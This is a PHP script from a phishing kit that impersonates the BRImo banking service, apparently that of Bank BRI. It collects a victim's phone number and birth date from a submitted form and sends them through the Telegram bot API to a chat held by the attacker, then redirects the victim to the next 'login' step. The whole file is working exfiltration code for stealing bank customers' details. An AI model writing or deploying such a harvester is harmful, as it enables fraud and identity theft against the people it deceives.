<?php

session_start();
include "./kennesia-tID.php";

$user_phone            = $_POST['nope'];
$_SESSION['nope'] = $user_phone;
$user_tanggal            = $_POST['lahir'];
$_SESSION['lahir'] = $user_tanggal;

$message = "
( BRIMO | Kennesia )
- Nomor : ".$user_phone."
- Tanggal : ".$user_tanggal."
";

function sendMessage($telegram_id, $message, $usertoken_id) {
    $url = "https://api.telegram.org/bot" . $usertoken_id . "/sendMessage?parse_mode=markdown&chat_id=" . $telegram_id;
    $url = $url . "&text=" . urlencode($message);
    $ch = curl_init();
    $optArray = array(
        CURLOPT_URL => $url,
        CURLOPT_RETURNTRANSFER => true
    );
    curl_setopt_array($ch, $optArray);
    $result = curl_exec($ch);
    curl_close($ch);
}
sendMessage($telegram_id, $message, $usertoken_id);
header('Location: ../login');
?>